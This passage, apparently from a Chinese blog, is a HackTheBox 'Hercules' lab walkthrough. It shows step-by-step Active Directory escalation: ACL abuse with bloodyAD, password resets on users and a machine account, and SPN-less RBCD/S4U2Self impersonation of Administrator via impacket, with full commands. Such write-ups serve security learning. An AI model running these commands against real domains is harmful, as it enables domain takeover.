+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">r</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">reason</span><span class="w"> </span><span class="n">they</span><span class="w"> </span><span class="n">were</span><span class="w"> </span><span class="n">unable</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">action</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">invalid</span><span class="w"> </span><span class="n">permiss</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ions</span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">double</span><span class="w"> </span><span class="n">checked</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">another</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">confirmed</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">team</span><span class="w"> </span><span class="n">has</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">permission</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">handle</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">changes</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">department</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">belongs</span><span class="w"> </span><span class="n">to</span><span class="o">=</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">told</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">contact</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">further</span><span class="w"> </span><span class="n">assistance</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">For</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="err">&#34;</span><span class="n">will</span><span class="p">.</span><span class="n">s</span><span class="err">&#34;</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="err">&#34;</span><span class="n">Engineering</span><span class="w"> </span><span class="n">Department</span><span class="err">&#34;</span><span class="w"> </span><span class="n">Unit</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">I</span><span class="w"> </span><span class="n">look</span><span class="w"> </span><span class="n">forward</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">reply</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Regards</span><span class="p">,</span><span class="w"> </span><span class="n">Ashley</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">--</span><span class="n">_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="nn">text/</span><span class="n">html</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="err">&#34;</span><span class="n">us</span><span class="o">-</span><span class="n">ascii</span><span class="err">&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span><span class="w"> </span><span class="n">quoted</span><span class="o">-</span><span class="n">printable</span><span class="w">
+</span></span></span></code></pre></div><p>大致内容如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104165021528-11826276.png" alt="image-20251104165016119"></p>
+<p>大概内容就是执行ps脚本来重置密码</p>
+<ul>
+<li>aCleanup.ps1</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">ashley</span><span class="p">.</span><span class="n">b</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">aCleanup</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&#34;Password Cleanup&#34;</span>
+</span></span></code></pre></div><p>文件中还提到了IT共享，查看一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251104170854641-1344981353.png" alt="image-20251104170848503"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105103350446-540474626.png" alt="image-20251105103343492"></p>
+<p>在这个文件夹里又找到个ps脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">CanPasswordChangeIn</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">param</span> <span class="p">(</span><span class="nv">$ace</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$ace</span><span class="p">.</span><span class="py">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s2">&#34;ExtendedRight|GenericAll&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="vm">$true</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="vm">$false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">CanChangePassword</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">param</span> <span class="p">(</span><span class="nv">$target</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$acls</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="s2">&#34;AD:</span><span class="nv">$target</span><span class="s2">&#34;</span><span class="p">).</span><span class="py">Access</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$ace</span> <span class="k">in</span> <span class="nv">$acls</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nv">$ace</span><span class="p">.</span><span class="py">IdentityReference</span> <span class="o">-eq</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="n">CanPasswordChangeIn</span> <span class="nv">$ace</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="vm">$true</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="vm">$false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">CleanArtifacts</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">param</span><span class="p">(</span><span class="nv">$Object</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Set-ADObject</span> <span class="n">-Identity</span> <span class="nv">$Object</span> <span class="n">-Clear</span> <span class="s2">&#34;adminCount&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$acl</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="s2">&#34;AD:</span><span class="nv">$Object</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$acl</span><span class="p">.</span><span class="py">SetAccessRuleProtection</span><span class="p">(</span><span class="vm">$False</span><span class="p">,</span> <span class="vm">$False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Set-Acl</span> <span class="n">-Path</span> <span class="s2">&#34;AD:</span><span class="nv">$Object</span><span class="s2">&#34;</span> <span class="n">-AclObject</span> <span class="nv">$acl</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$group</span> <span class="p">=</span> <span class="s2">&#34;HERCULES\IT Support&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$objects</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-SearchBase</span> <span class="s2">&#34;OU=DCHERCULES,DC=HERCULES,DC=HTB&#34;</span><span class="p">).</span><span class="py">DistinguishedName</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Path</span> <span class="p">=</span> <span class="s2">&#34;C:\Users\ashley.b\Scripts\log.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="n">-Path</span> <span class="nv">$Path</span> <span class="n">-Value</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$object</span> <span class="k">in</span> <span class="nv">$objects</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">CanChangePassword</span> <span class="nv">$object</span> <span class="nv">$group</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$Members</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-SearchBase</span> <span class="nv">$object</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="py">DistinguishedName</span> <span class="o">-ne</span> <span class="nv">$object</span> <span class="p">}).</span><span class="py">DistinguishedName</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$DN</span> <span class="k">in</span> <span class="nv">$Members</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">CleanArtifacts</span> <span class="nv">$DN</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$_</span><span class="p">.</span><span class="py">Exception</span><span class="p">.</span><span class="py">Message</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$Path</span> <span class="n">-Append</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Cleanup : </span><span class="nv">$DN</span><span class="s2">&#34;</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="nv">$Path</span> <span class="n">-Append</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这个脚本遍历指定 OU 中 <code>IT Support</code> 组可重置密码的对象，并对其下所有子对象 清除 adminCount 属性并启用 ACL 继承，以清理高权限账户的残留痕迹，目前好像没什么可以继续利用的了。</p>
+<p>从之前的结果中可以发现，在<code>Forest Migration OU</code>里的用户还有<code>iis_administrator</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105105021695-1100375388.png" alt="image-20251105105015194"></p>
+<p>但是我在bloodhound上并没有搜到这个用户，可能没有收集全，重新用<code>auditor</code>收集一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodhound-python -u auditor -p <span class="s1">&#39;Aa123456!&#39;</span> -c All -d hercules.htb -ns 10.10.11.91 --zip --use-ldap
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105111048861-1091868681.png" alt="image-20251105111042187"></p>
+<p>这回没问题了，发现<code>iis_administrator</code>属于<code>SERVICE OPERATORS</code>组，而且这个组可以强制改<code>IIS_WEBSERVER$</code>用户的密码，同时注意到<code>IIS_WEBSERVER$</code>还是个机器账户，后续怎么用后面再说</p>
+<h1 id="更改iis_webserver密码">
+<a class="header-anchor" href="#%e6%9b%b4%e6%94%b9iis_webserver%e5%af%86%e7%a0%81"></a>
+更改IIS_WEBSERVER$密码
+</h1><p><strong>先重置<code>iis_administrator</code>的密码</strong></p>
+<p>用<code>auditor</code>给<code>IT SUPPORT</code>一个<code>GenericAll</code>权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host <span class="s1">&#39;dc.hercules.htb&#39;</span> -d <span class="s1">&#39;hercules.htb&#39;</span> -u <span class="s1">&#39;auditor&#39;</span> -k add genericAll <span class="s1">&#39;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&#39;</span> <span class="s1">&#39;IT SUPPORT&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105112040991-1970466169.png" alt="image-20251105112034328"></p>
+<p>再给<code>auditor</code>一个<code>GenericAll</code>权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -p <span class="s1">&#39;Aa123456!&#39;</span> -k add genericAll <span class="s1">&#39;OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB&#39;</span> Auditor
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105112150743-1050666770.png" alt="image-20251105112144648"></p>
+<p>然后启用<code>iis_administrator</code>用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d <span class="s1">&#39;hercules.htb&#39;</span> -u <span class="s1">&#39;auditor&#39;</span> -p <span class="s1">&#39;Aa123456!&#39;</span> -k remove uac <span class="s1">&#39;iis_administrator&#39;</span> -f ACCOUNTDISABLE
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105140343975-1200485803.png" alt="image-20251105140337346"></p>
+<p><strong>PS: 如果出现权限不足的情况，需要先执行下ps脚本<code>.\aCleanup.ps1</code>然后重新执行一遍这三条命令</strong></p>
+<p>验证一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="s2">&#34;iis_administrator&#34;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105140613159-341457701.png" alt="image-20251105140606757"></p>
+<p>接下来就可以直接改密码了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k <span class="nb">set</span> password <span class="s1">&#39;iis_administrator&#39;</span> <span class="s1">&#39;Aa123456!&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105140637942-2012088287.png" alt="image-20251105140631212"></p>
+<p><strong>下面就要改<code>IIS_WEBSERVER$</code>的密码了</strong></p>
+<p>请求<code>iis_administrator</code>的<code>TGT</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;hercules.htb&#39;</span>/<span class="s1">&#39;iis_administrator&#39;</span>:<span class="s1">&#39;Aa123456!&#39;</span> -dc-ip 10.10.11.91
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105141137422-2046362001.png" alt="image-20251105141131075"></p>
+<p>导入票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>iis_administrator.ccache
+</span></span></code></pre></div><p>修改密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bloodyAD --host dc.hercules.htb -d hercules.htb  -u <span class="s1">&#39;iis_administrator&#39;</span> -k <span class="nb">set</span> password <span class="s1">&#39;iis_webserver$&#39;</span> <span class="s1">&#39;Aa123456!&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251105141426274-1649877997.png" alt="image-20251105141419999"></p>
+<h1 id="rbcds4u2self滥用">
+<a class="header-anchor" href="#rbcds4u2self%e6%bb%a5%e7%94%a8"></a>
+RBCD+S4U2Self滥用
+</h1><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106103358423-1865802517.png" alt="image-20251106103347102"></p>
+<p>在<code>bloodhound</code>中发现<code>iis_webserver$</code>对<code>iis_webserver$</code>有<code>AllowedToAct</code></p>
+<blockquote>
+<p>这个权限大概的意思是：IIS_WEBSERVER$  →  可以冒充任何人  →  访问 DC 的任何服务（cifs、ldap、host、rpcss&hellip;）</p>
+<p>但是需要注意的是正常打的话，会产生一个报错</p>
+<p><code>[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)</code>
+<code>[-] Probably user IIS_WEBSERVER$ does not have constrained delegation permisions or impersonated user does not exist</code></p>
+<p>原因是找不到spn，所以我们要找无SPN 的打法</p>
+<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd?utm_source=chatgpt.com#rbcd-on-spn-less-users">参考</a></p>
+</blockquote>
+<p>按照顺序执行命令即可</p>
+<p>请求TGT：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT -hashes :<span class="k">$(</span>pypykatz crypto nt <span class="s1">&#39;Aa123456!&#39;</span><span class="k">)</span> <span class="s1">&#39;hercules.htb/iis_webserver$&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106110527869-266966559.png" alt="image-20251106110519601"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-describeTicket <span class="s1">&#39;iis_webserver$.ccache&#39;</span> <span class="p">|</span> grep <span class="s1">&#39;Ticket Session Key&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106110706934-1284446919.png" alt="image-20251106110658628"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] Ticket Session Key            : 6a36fd9aef24ea729f1064972bfec7fa
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>iis_webserver$.ccache
+</span></span><span class="line"><span class="cl">impacket-changepasswd -k -newhashes :6a36fd9aef24ea729f1064972bfec7fa <span class="s1">&#39;hercules.htb/iis_webserver$&#39;</span>:<span class="s1">&#39;Aa123456!&#39;</span>@<span class="s1">&#39;dc.hercules.htb&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106111337565-1897002886.png" alt="image-20251106111329270"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getST -u2u -impersonate <span class="s2">&#34;Administrator&#34;</span> -spn <span class="s2">&#34;host/dc.hercules.htb&#34;</span> -k -no-pass <span class="s1">&#39;hercules.htb/iis_webserver$&#39;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106111448865-1646205756.png" alt="image-20251106111440645"></p>
+<p>导入票据登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@host_dc.hercules.htb@HERCULES.HTB.ccache
+</span></span><span class="line"><span class="cl">python3 evil_winrmexec.py -ssl -port <span class="m">5986</span> -k -no-pass dc.hercules.htb
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251106111815604-1005363222.png" alt="image-20251106111806802"></p>
+<p>在<code>C:\Users\Admin\Desktop</code>找到<code>root.txt</code></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/adcs"
+        rel="tag"
+        >ADCS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/rid-cycling"
+        rel="tag"
+        >RID CYCLING</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/shadow-credentials"
+        rel="tag"
+        >SHADOW CREDENTIALS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/adcs-esc3"
+        rel="tag"
+        >ADCS-ESC3</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/rbcd-on-spn-less"
+        rel="tag"
+        >RBCD ON SPN-LESS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/acl-abuse"
+        rel="tag"
+        >ACL ABUSE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ldap-injection"
+        rel="tag"
+        >LDAP INJECTION</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ntlm-relay"
+        rel="tag"
+        >NTLM RELAY</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_15.webp"
+              data-sizes="auto"
+              alt="HTB Rebound"
+              class="lazyload"
+            /><a
+          href="/post/htb-rebound/"
+          aria-label="前一篇:HTB Rebound"
+          title="前一篇:HTB Rebound"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">HTB Rebound</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#web渗透">Web渗透</a>
+      <ul>
+        <li><a href="#枚举用户名">枚举用户名</a></li>
+        <li><a href="#ldap注入">LDAP注入</a></li>
+        <li><a href="#任意文件读取cookie伪造越权">任意文件读取+Cookie伪造越权</a></li>
+        <li><a href="#文件上传ntlm反射">文件上传+NTLM反射</a></li>
+      </ul>
+    </li>
+    <li><a href="#域信息收集分析">域信息收集+分析</a></li>
+    <li><a href="#shadow-credentials-攻击">Shadow Credentials 攻击</a></li>
+    <li><a href="#acl滥用">ACL滥用</a></li>
+    <li><a href="#修改auditor密码">修改Auditor密码</a></li>
+    <li><a href="#远程登陆-auditorusertxt">远程登陆 auditor+user.txt</a></li>
+    <li><a href="#机器信息收集">机器信息收集</a></li>
+    <li><a href="#更改fernandor密码">更改fernando.r密码</a></li>
+    <li><a href="#adcs-esc3证书攻击">ADCS ESC3证书攻击</a></li>
+    <li><a href="#rbcd">RBCD</a></li>
+    <li><a href="#远程登陆-ashleyb">远程登陆 ashley.b</a></li>
+    <li><a href="#更改iis_webserver密码">更改IIS_WEBSERVER$密码</a></li>
+    <li><a href="#rbcds4u2self滥用">RBCD+S4U2Self滥用</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
